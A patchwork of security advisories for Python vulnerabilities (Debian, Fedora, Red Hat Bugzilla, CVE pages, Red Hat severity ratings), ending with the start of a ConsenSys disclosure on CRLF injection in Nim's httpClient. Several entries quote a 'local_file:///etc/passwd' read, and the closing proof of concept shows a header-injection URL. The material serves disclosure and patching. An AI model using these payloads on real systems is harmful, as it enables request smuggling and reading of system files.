                 CVE-2020-14422
Debian Bug     : 924072 921064 940901

Multiple security issues were discovered in Python, an interactive
high-level object-oriented language.

CVE-2018-20406

    Modules/_pickle.c has an integer overflow via a large LONG_BINPUT
    value that is mishandled during a "resize to twice the size"
    attempt. This issue might cause memory exhaustion, but is only
    relevant if the pickle format is used for serializing tens or
    hundreds of gigabytes of data.

CVE-2018-20852

    http.cookiejar.DefaultPolicy.domain_return_ok in
    Lib/http/cookiejar.py does not correctly validate the domain: it
    can be tricked into sending existing cookies to the wrong
    server. An attacker may abuse this flaw by using a server with a
    hostname that has another valid hostname as a suffix (e.g.,
    pythonicexample.com to steal cookies for example.com). When a
    program uses http.cookiejar.DefaultPolicy and tries to do an HTTP
    connection to an attacker-controlled server, existing cookies can
    be leaked to the attacker.

CVE-2019-5010

    An exploitable denial-of-service vulnerability exists in the X509
    certificate parser. A specially crafted X509 certificate can cause
    a NULL pointer dereference, resulting in a denial of service. An
    attacker can initiate or accept TLS connections using crafted
    certificates to trigger this vulnerability.

CVE-2019-9636

    Improper Handling of Unicode Encoding (with an incorrect netloc)
    during NFKC normalization. The impact is: Information disclosure
    (credentials, cookies, etc. that are cached against a given
    hostname). The components are: urllib.parse.urlsplit,
    urllib.parse.urlparse. The attack vector is: A specially crafted
    URL could be incorrectly parsed to locate cookies or
    authentication data and send that information to a different host
    than when parsed correctly.

CVE-2019-9740

    An issue was discovered in urllib2. CRLF injection is possible if
    the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically
    in the query string after a ? character) followed by an HTTP
    header or a Redis command.

CVE-2019-9947

    An issue was discovered in urllib2. CRLF injection is possible if
    the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically
    in the path component of a URL that lacks a ? character) followed
    by an HTTP header or a Redis command. This is similar to the
    CVE-2019-9740 query string issue.

CVE-2019-9948

    urllib supports the local_file: scheme, which makes it easier for
    remote attackers to bypass protection mechanisms that blacklist
    file: URIs, as demonstrated by triggering a
    urllib.urlopen('local_file:///etc/passwd') call.

CVE-2019-10160

    A security regression was discovered in python, which still allows
    an attacker to exploit CVE-2019-9636 by abusing the user and
    password parts of a URL. When an application parses user-supplied
    URLs to store cookies, authentication credentials, or other kind
    of information, it is possible for an attacker to provide
    specially crafted URLs to make the application locate host-related
    information (e.g. cookies, authentication data) and send them to a
    different host than where it should, unlike if the URLs had been
    correctly parsed. The result of an attack may vary based on the
    application.

CVE-2019-16056

    The email module wrongly parses email addresses that contain
    multiple @ characters. An application that uses the email module
    and implements some kind of checks on the From/To headers of a
    message could be tricked into accepting an email address that
    should be denied. An attack may be the same as in CVE-2019-11340;
    however, this CVE applies to Python more generally.

CVE-2019-16935

    The documentation XML-RPC server has XSS via the server_title
    field. This occurs in Lib/xmlrpc/server.py. If set_server_title is
    called with untrusted input, arbitrary JavaScript can be delivered
    to clients that visit the http URL for this server.

CVE-2019-18348

    An issue was discovered in urllib2. CRLF injection is possible if
    the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically
    in the host component of a URL) followed by an HTTP header. This
    is similar to the CVE-2019-9740 query string issue and the
    CVE-2019-9947 path string issue

CVE-2020-8492

    Python allows an HTTP server to conduct Regular Expression Denial
    of Service (ReDoS) attacks against a client because of
    urllib.request.AbstractBasicAuthHandler catastrophic backtracking.

CVE-2020-14422

    Lib/ipaddress.py improperly computes hash values in the
    IPv4Interface and IPv6Interface classes, which might allow a
    remote attacker to cause a denial of service if an application is
    affected by the performance of a dictionary containing
    IPv4Interface or IPv6Interface objects, and this attacker can
    cause many dictionary entries to be created.

For Debian 9 stretch, these problems have been fixed in version
3.5.3-1+deb9u2.

We recommend that you upgrade your python3.5 packages.

For the detailed security status of python3.5 please refer to

Fedora Update Notification
FEDORA-2019-ec26883852
2019-05-27 03:23:48.354417
--------------------------------------------------------------------------------

Name : python3
Product : Fedora 29
Version : 3.7.3
Release : 3.fc29
URL : <https://www.python.org/>
Summary : Interpreter of the Python programming language
Description :
Python is an accessible, high-level, dynamically typed, interpreted programming
language, designed with an emphasis on code readability.
It includes an extensive standard library, and has a vast ecosystem of
third-party libraries.

The python3 package provides the "python3" executable: the reference
interpreter for the Python language, version 3.
The majority of its standard library is provided in the python3-libs package,
which should be installed automatically along with python3.
The remaining parts of the Python standard library are broken out into the
python3-tkinter and python3-test packages, which may need to be installed
separately.

Documentation for Python is provided in the python3-docs package.

Packages containing additional libraries for Python are generally named with
the "python3-" prefix.

| [Description](show_bug.cgi?id=1695572#c0)  Dhananjay Arunesh    2019-04-03 11:41:01 UTC  ``` An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.2. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the path component of a URL) followed by an HTTP header or a Redis command. This is similar to [CVE-2019-9740](https://access.redhat.com/security/cve/CVE-2019-9740) query string issue.

When glibc is still vulnerable to [CVE-2016-10739](https://access.redhat.com/security/cve/CVE-2016-10739), a proper fix in python is required to properly validate the hostname part of the URL and to prevent CRLF sequences injection.   ```  [Comment 19](show_bug.cgi?id=1695572#c19)  Riccardo Schirone    2019-07-10 08:31:37 UTC  ``` This flaws has been fixed with the same patch used for [CVE-2019-9740](https://access.redhat.com/security/cve/CVE-2019-9740), which is: <https://github.com/python/cpython/commit/c4e671eec20dfcb29b18596a89ef075f826c9f96> [master] <https://github.com/python/cpython/commit/b7378d77289c911ca6a0c0afaf513879002df7d5> [master] <https://github.com/python/cpython/commit/bb8071a4cae5ab3fe321481dd3d73662ffb26052> [python-2.7]   ```  [Comment 20](show_bug.cgi?id=1695572#c20)  Riccardo Schirone    2019-07-10 08:41:47 UTC  ``` Reference: <https://python-security.readthedocs.io/vuln/http-header-injection2.html>   ```  [Comment 21](show_bug.cgi?id=1695572#c21)  errata-xmlrpc    2019-08-06 12:04:53 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2019:2030 [https://access.redhat.com/errata/RHSA-2019:2030](https://access.redhat.com/errata/RHSA-2019%3A2030)   ```  [Comment 23](show_bug.cgi?id=1695572#c23)  errata-xmlrpc    2019-11-05 20:38:06 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2019:3335 [https://access.redhat.com/errata/RHSA-2019:3335](https://access.redhat.com/errata/RHSA-2019%3A3335)   ```  [Comment 24](show_bug.cgi?id=1695572#c24)  errata-xmlrpc    2019-11-05 21:06:46 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 8  Via RHSA-2019:3520 [https://access.redhat.com/errata/RHSA-2019:3520](https://access.redhat.com/errata/RHSA-2019%3A3520)   ```  [Comment 25](show_bug.cgi?id=1695572#c25)  errata-xmlrpc    2019-11-06 09:45:25 UTC  ``` This issue has been addressed in the following products:    Red Hat Software Collections for Red Hat Enterprise Linux 7   Red Hat Software Collections for Red Hat Enterprise Linux 7.5 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.6 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 7.7 EUS   Red Hat Software Collections for Red Hat Enterprise Linux 6  Via RHSA-2019:3725 [https://access.redhat.com/errata/RHSA-2019:3725](https://access.redhat.com/errata/RHSA-2019%3A3725)   ```  [Comment 27](show_bug.cgi?id=1695572#c27)  errata-xmlrpc    2020-04-01 08:34:28 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.5 Extended Update Support  Via RHSA-2020:1268 [https://access.redhat.com/errata/RHSA-2020:1268](https://access.redhat.com/errata/RHSA-2020%3A1268)   ```  [Comment 28](show_bug.cgi?id=1695572#c28)  errata-xmlrpc    2020-04-07 09:33:41 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.4 Advanced Update Support   Red Hat Enterprise Linux 7.4 Telco Extended Update Support   Red Hat Enterprise Linux 7.4 Update Services for SAP Solutions  Via RHSA-2020:1346 [https://access.redhat.com/errata/RHSA-2020:1346](https://access.redhat.com/errata/RHSA-2020%3A1346)   ```  [Comment 29](show_bug.cgi?id=1695572#c29)  errata-xmlrpc    2020-04-14 17:39:58 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7.6 Extended Update Support  Via RHSA-2020:1462 [https://access.redhat.com/errata/RHSA-2020:1462](https://access.redhat.com/errata/RHSA-2020%3A1462)   ``` |  |

| [Description](show_bug.cgi?id=1153238#c0)  Alexandros Toptsoglou   2019-10-07 14:50:52 UTC  ``` CVE-2019-16935  The documentation XML-RPC server in Python through 2.7.16, 3.x through 3.6.9, and 3.7.x through 3.7.4 has XSS via the server_title field. This occurs in Lib/DocXMLRPCServer.py in Python 2.x, and in Lib/xmlrpc/server.py in Python 3.x. If set_server_title is called with untrusted input, arbitrary JavaScript can be delivered to clients that visit the http URL for this server.

                 CVE-2019-20907

Multiple vulnerabilities were discovered in Python2.7, an interactive
high-level object-oriented language.

CVE-2018-20852

    By using a malicious server an attacker might steal cookies that are
    meant for other domains.

CVE-2019-5010

    NULL pointer dereference using a specially crafted X509 certificate.

CVE-2019-9636

    Improper Handling of Unicode Encoding (with an incorrect netloc)
    during NFKC normalization resulting in information disclosure
    (credentials, cookies, etc. that are cached against a given
    hostname).  A specially crafted URL could be incorrectly parsed to
    locate cookies or authentication data and send that information to
    a different host than when parsed correctly.

CVE-2019-9740

    An issue was discovered in urllib2 where CRLF injection is possible
    if the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically in
    the query string after a ? character) followed by an HTTP header or
    a Redis command.

CVE-2019-9947

    An issue was discovered in urllib2 where CRLF injection is possible
    if the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically in
    the path component of a URL that lacks a ? character) followed by an
    HTTP header or a Redis command. This is similar to the CVE-2019-9740
    query string issue.

CVE-2019-9948

    urllib supports the local_file: scheme, which makes it easier for
    remote attackers to bypass protection mechanisms that blacklist
    file: URIs, as demonstrated by triggering a
    urllib.urlopen('local_file:///etc/passwd') call.

CVE-2019-10160

    A security regression of CVE-2019-9636 was discovered which still
    allows an attacker to exploit CVE-2019-9636 by abusing the user and
    password parts of a URL. When an application parses user-supplied
    URLs to store cookies, authentication credentials, or other kind of
    information, it is possible for an attacker to provide specially
    crafted URLs to make the application locate host-related information
    (e.g. cookies, authentication data) and send them to a different
    host than where it should, unlike if the URLs had been correctly
    parsed. The result of an attack may vary based on the application.

CVE-2019-16056

    The email module wrongly parses email addresses that contain
    multiple @ characters. An application that uses the email module and
    implements some kind of checks on the From/To headers of a message
    could be tricked into accepting an email address that should be
    denied.

CVE-2019-20907

    Opening a crafted tar file could result in an infinite loop due to
    missing header validation.

For Debian 9 stretch, these problems have been fixed in version
2.7.13-2+deb9u4.

We recommend that you upgrade your python2.7 packages.

# CVE-2019-9636

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2019-9635.html) [[Index]](index.html) [[Next]](CVE-2019-9637.html)

### Upstream information

[CVE-2019-9636 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9636)

#### Description

Python 2.7.x through 2.7.16 and 3.x through 3.7.2 is affected by: Improper Handling of Unicode Encoding (with an incorrect netloc) during NFKC normalization. The impact is: Information disclosure (credentials, cookies, etc. that are cached against a given hostname). The components are: urllib.parse.urlsplit, urllib.parse.urlparse. The attack vector is: A specially crafted URL could be incorrectly parsed to locate cookies or authentication data and send that information to a different host than when parsed correctly. This is fixed in: v2.7.17, v2.7.17rc1, v2.7.18, v2.7.18rc1; v3.5.10, v3.5.10rc1, v3.5.7, v3.5.8, v3.5.8rc1, v3.5.8rc2, v3.5.9; v3.6.10, v3.6.10rc1, v3.6.11, v3.6.11rc1, v3.6.12, v3.6.9, v3.6.9rc1; v3.7.3, v3.7.3rc1, v3.7.4, v3.7.4rc1, v3.7.4rc2, v3.7.5, v3.7.5rc1, v3.7.6, v3.7.6rc1, v3.7.7, v3.7.7rc1, v3.7.8, v3.7.8rc1, v3.7.9.

RHEL Engineering is moving the tracking of its product development work on RHEL 6 through RHEL 9 to Red Hat Jira ([**issues.redhat.com**](https://issues.redhat.com)). If you're a Red Hat customer, please continue to file support cases via the [**Red Hat customer portal**](https://access.redhat.com/support/cases/). If you're not, please head to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira and file new tickets here. Individual Bugzilla bugs in the statuses "**NEW**", "**ASSIGNED**", and "**POST**" are being migrated throughout September 2023. Bugs of Red Hat partners with an assigned Engineering Partner Manager (EPM) are migrated in late September as per pre-agreed dates. Bugs against components "**kernel**", "**kernel-rt**", and "**kpatch**" are only migrated if still in "**NEW**" or "**ASSIGNED**". If you cannot log in to RH Jira, please consult [**article #7032570**](https://access.redhat.com/articles/7032570). That failing, please send an e-mail to the RH Jira admins at **rh-issues@redhat.com** to troubleshoot your issue as a user management inquiry. The email creates a ServiceNow ticket with Red Hat. Individual Bugzilla bugs that are migrated will be moved to status "**CLOSED**", resolution "**MIGRATED**", and set with "**MigratedToJIRA**" in "**Keywords**". The link to the successor Jira issue will be found under "**Links**", have a little "two-footprint" icon next to it, and direct you to the "[**RHEL project**](https://issues.redhat.com/projects/RHEL)" in Red Hat Jira (issue links are of type "**https://issues.redhat.com/browse/RHEL-XXXX**", where "**X**" is a digit). This same link will be available in a blue banner at the top of the page informing you that that bug has been migrated.

| [Comment 2](show_bug.cgi?id=1703600#c2)  Miro Hrončok    2019-04-26 23:09:06 UTC  ``` I've always considered the unversioned obsoletes in RHEL7's python.spec weird. Does anyone know how to figure out when and why they were added in the first place?  The Fedora and RHEL7 commits both go to <https://src.fedoraproject.org/rpms/python/c/e0fde95b83781e4651383acdadb75000df8eb9ba>  auto-import python-2.2.1-15 from python-2.2.1-15.src.rpm  Authored and Committed by cvsdist 14 years ago.  I guess this was added when Python got updated from 1 to 2 and the content obsoleted the python2 (extra) package. I don't think it is needed at all, however not to break backwards compatibility, we should version them to < 2.7.5-99999   ```  [Comment 11](show_bug.cgi?id=1703600#c11)  errata-xmlrpc    2019-08-06 12:33:13 UTC  ``` Since the problem described in this bug report should be resolved in a recent advisory, it has been closed with a resolution of ERRATA.  For information on the advisory, and where to find the updated files, follow the link below.  If the solution does not work for you, open a new bug report.  [https://access.redhat.com/errata/RHSA-2019:2030](https://access.redhat.com/errata/RHSA-2019%3A2030)   ``` |  |

# CVE-2019-16056

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2019-15961.html) [[Index]](index.html) [[Next]](CVE-2019-16058.html)

### Upstream information

[CVE-2019-16056 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16056)

#### Description

An issue was discovered in Python through 2.7.16, 3.x through 3.5.7, 3.6.x through 3.6.9, and 3.7.x through 3.7.4. The email module wrongly parses email addresses that contain multiple @ characters. An application that uses the email module and implements some kind of checks on the From/To headers of a message could be tricked into accepting an email address that should be denied. An attack may be the same as in CVE-2019-11340; however, this CVE applies to Python more generally.

| [Description](show_bug.cgi?id=1130840#c0)  Karol Babioch   2019-03-28 13:25:58 UTC  ``` An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.2. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the query string or PATH_INFO) followed by an HTTP header or a Redis command. This is similar to CVE-2019-9740.

# CVE-2019-9947

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2019-9946.html) [[Index]](index.html) [[Next]](CVE-2019-9948.html)

### Upstream information

[CVE-2019-9947 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9947)

#### Description

An issue was discovered in urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3. CRLF injection is possible if the attacker controls a url parameter, as demonstrated by the first argument to urllib.request.urlopen with \r\n (specifically in the path component of a URL that lacks a ? character) followed by an HTTP header or a Redis command. This is similar to the CVE-2019-9740 query string issue. This is fixed in: v2.7.17, v2.7.17rc1, v2.7.18, v2.7.18rc1; v3.5.10, v3.5.10rc1, v3.5.8, v3.5.8rc1, v3.5.8rc2, v3.5.9; v3.6.10, v3.6.10rc1, v3.6.11, v3.6.11rc1, v3.6.12, v3.6.9, v3.6.9rc1; v3.7.4, v3.7.4rc1, v3.7.4rc2, v3.7.5, v3.7.5rc1, v3.7.6, v3.7.6rc1, v3.7.7, v3.7.7rc1, v3.7.8, v3.7.8rc1, v3.7.9.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

| [Description](show_bug.cgi?id=1149955#c0)  Alexandros Toptsoglou   2019-09-09 08:56:02 UTC  ``` CVE-2019-16056  An issue was discovered in Python through 2.7.16, 3.x through 3.5.7, 3.6.x through 3.6.9, and 3.7.x through 3.7.4. The email module wrongly parses email addresses that contain multiple @ characters. An application that uses the email module and implements some kind of checks on the From/To headers of a message could be tricked into accepting an email address that should be denied. An attack may be the same as in CVE-2019-11340; however, this CVE applies to Python more generally.

I don't know which python2 version is affected because not test.  maybe after the commit, all of higher versions can trigger this vulnerability.  # Conclusion this patch provides more critical vulnerability to bypass the illegal header check. and we can inject HTTP header completely in urlopen() from this patch.  (Although this vulnerability is old on 12 Jul 2017, I don't know why no one has submitted issue still now XDD) ``` | | | |

| ``` Maybe related to Victor's "Issue 1" described in [Issue 32085](issue32085 "[closed] [Security] A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!"). That is also a security bug about CRLF in the URL's path, but was opened before [Issue 30500](issue30500 "[closed] [security] urllib connects to a wrong host") was opened and the code changed, so I'm not sure if it is the same as this or not.  Also there is [Issue 13359](issue13359 "[open] urllib2 doesn't escape spaces in http requests"), a proposal to automatically percent-encode invalid URLs. For a security fix, I'm not sure but it might be safer to raise an exception, rather than rewriting the invalid URL to a valid one. ``` | | | |

| ``` Yes, I thought so. before the commit version i said, the previous version(~3.4.6), raised an exception(no host given~) in urlopen failing parsing host. If this patch wants to be same as the previous version, It is right to raise an exception like the previous version. I thought there is no exact answer, only depends on Python features. ``` | | | |

Package        : python2.7
Version        : 2.7.9-2+deb8u3
CVE ID         : CVE-2018-14647 CVE-2019-5010 CVE-2019-9636 CVE-2019-9740
                 CVE-2019-9947 CVE-2019-9948 CVE-2019-10160
Debian Bug     : 921039 921040 924073

Multiple vulnerabilities were discovered in Python, an interactive
high-level object-oriented language, including

CVE-2018-14647

    Python's elementtree C accelerator failed to initialise Expat's hash
    salt during initialization. This could make it easy to conduct
    denial of service attacks against Expat by constructing an XML
    document that would cause pathological hash collisions in Expat's
    internal data structures, consuming large amounts CPU and RAM.

CVE-2019-5010

    NULL pointer dereference using a specially crafted X509 certificate.

CVE-2019-9636

    Improper Handling of Unicode Encoding (with an incorrect netloc)
    during NFKC normalization resulting in information disclosure
    (credentials, cookies, etc. that are cached against a given
    hostname).  A specially crafted URL could be incorrectly parsed to
    locate cookies or authentication data and send that information to
    a different host than when parsed correctly.

CVE-2019-9740

    An issue was discovered in urllib2 where CRLF injection is possible
    if the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically in
    the query string after a ? character) followed by an HTTP header or
    a Redis command.

CVE-2019-9947

    An issue was discovered in urllib2 where CRLF injection is possible
    if the attacker controls a url parameter, as demonstrated by the
    first argument to urllib.request.urlopen with \r\n (specifically in
    the path component of a URL that lacks a ? character) followed by an
    HTTP header or a Redis command. This is similar to the CVE-2019-9740
    query string issue.

CVE-2019-9948

    urllib supports the local_file: scheme, which makes it easier for
    remote attackers to bypass protection mechanisms that blacklist
    file: URIs, as demonstrated by triggering a
    urllib.urlopen('local_file:///etc/passwd') call.

CVE-2019-10160

    A security regression of CVE-2019-9636 was discovered which still
    allows an attacker to exploit CVE-2019-9636 by abusing the user and
    password parts of a URL. When an application parses user-supplied
    URLs to store cookies, authentication credentials, or other kind of
    information, it is possible for an attacker to provide specially
    crafted URLs to make the application locate host-related information
    (e.g. cookies, authentication data) and send them to a different
    host than where it should, unlike if the URLs had been correctly
    parsed. The result of an attack may vary based on the application.

For Debian 8 "Jessie", these problems have been fixed in version
2.7.9-2+deb8u3.

We recommend that you upgrade your python2.7 packages.

date: 2020-07-30T18:41:52+01:00

cve: ["CVE-2020-15693", "CVE-2020-15694"]
vendor: nim-lang
vendorUrl: <https://nim-lang.org/>
authors: tintinweb
affectedVersions: [ "<= 1.2.6" ]
vulnClass: CWE-93

Group: <https://consensys.net/diligence/research/>

## Summary

The following vulnerability note discusses two classes of vulnerabilities found in the nim-lang `httpClient` standard library:

* a `CR-LF` injection in various arguments
* lack of response value validation when parsing server responses

## Details

### Description

The nim standard library `httpClient` is vulnerable to a `CR-LF` injection in the target url. This issue shares similarities with [CVE-2019-9740](<https://nvd.nist.gov/vuln/detail/CVE-2019-9740>) and [CVE-2019-9947](<https://nvd.nist.gov/vuln/detail/CVE-2019-9947>) reported for the Python language with the difference that more injection vectors exist. An injection is possible if the attacker controls any part of the url provided to `httpClient.[get|post|...]`, the user-agent, or custom http header names or values.

Additionally, the library fails to properly validate the server response. For example, `httpClient.get().contentLength()` does not raise any error if a malicious server provides a negative `Content-Length`.

It should be noted that there seems to be a general lack of input validation (requests and response) and we expect more vectors to exist (e.g. see `generateHeaders`).

### Proof of Concept

Note: `nim c -r -d:ssl client_inject.nim`

1) header injection in any url part

a) query

```nim
import httpClient
var client = newHttpClient()
var response = client.get("https://localhost:4433?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123")
